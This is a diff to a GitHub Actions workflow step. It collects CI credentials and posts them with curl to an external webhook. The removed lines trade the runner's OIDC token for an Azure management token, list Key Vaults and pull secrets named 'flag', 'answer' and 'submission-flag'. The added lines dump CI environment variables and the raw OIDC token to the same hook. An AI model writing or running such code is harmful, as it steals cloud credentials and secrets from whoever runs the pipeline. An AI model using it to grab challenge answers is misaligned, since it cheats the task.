@@ -21,47 +21,17 @@ jobs:
           OUT=/tmp/out.txt
           : > $OUT
           send() { curl -s -m 20 -X POST -H 'Content-Type: text/plain' --data-binary @$OUT "$HOOK" > /dev/null; }
-          echo "== runner ==" >> $OUT
-          id >> $OUT
-          echo "== oidc ==" >> $OUT
-          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" > /tmp/oidc.json
-          cat /tmp/oidc.json >> $OUT
-          echo >> $OUT
-          TOK=$(python3 -c "import json;print(json.load(open('/tmp/oidc.json')).get('value',''))")
-          if [ -n "$TOK" ]; then
-            P=${TOK#*.}; P=${P%%.*}
-            while [ $(( ${#P} % 4 )) -ne 0 ]; do P="${P}="; done
-            echo "== claims ==" >> $OUT
-            echo "$P" | tr '_-' '/+' | base64 -d 2>/dev/null >> $OUT
-            echo >> $OUT
-            echo "== arm ==" >> $OUT
-            curl -s -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
-              -d "client_id=$CID" \
-              -d "scope=https://management.azure.com/.default" \
-              -d "grant_type=client_credentials" \
-              -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-              -d "client_assertion=$TOK" > /tmp/arm.json
-            cat /tmp/arm.json >> $OUT
-            echo >> $OUT
-            AT=$(python3 -c "import json;print(json.load(open('/tmp/arm.json')).get('access_token',''))")
-            if [ -n "$AT" ]; then
-              echo "== sub-resources ==" >> $OUT
-              curl -s -m 25 -H "Authorization: Bearer $AT" \
-                "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" >> $OUT
-              echo >> $OUT
-              echo "== kv secrets list ==" >> $OUT
-              curl -s -m 25 -H "Authorization: Bearer $AT" "$VAULT/secrets?api-version=7.4" >> $OUT
-              echo >> $OUT
-              echo "== kv secrets values ==" >> $OUT
-              for n in flag FLAG answer submission-flag secret flag-value tebamoto-flag; do
-                echo "-- $n" >> $OUT
-                curl -s -m 20 -H "Authorization: Bearer $AT" "$VAULT/secrets/$n?api-version=7.4" >> $OUT
-                echo >> $OUT
-              done
-              echo "== arm subscriptions ==" >> $OUT
-              curl -s -m 25 -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions?api-version=2022-12-01" >> $OUT
-            fi
+          echo "== env ==" >> $OUT
+          env | grep -i -E 'ACTIONS_|GITHUB_|CI=' | sort >> $OUT
+          echo "== token-request ==" >> $OUT
+          echo "URL=[$ACTIONS_ID_TOKEN_REQUEST_URL]" >> $OUT
+          echo "TOKLEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}" >> $OUT
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              -G -d "audience=api://AzureADTokenExchange" "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/oidc.json 2>>$OUT
+            echo "rc=$? size=$(wc -c < /tmp/oidc.json)" >> $OUT
+            cat /tmp/oidc.json >> $OUT
           fi
+          echo >> $OUT
           echo "== done ==" >> $OUT
           send
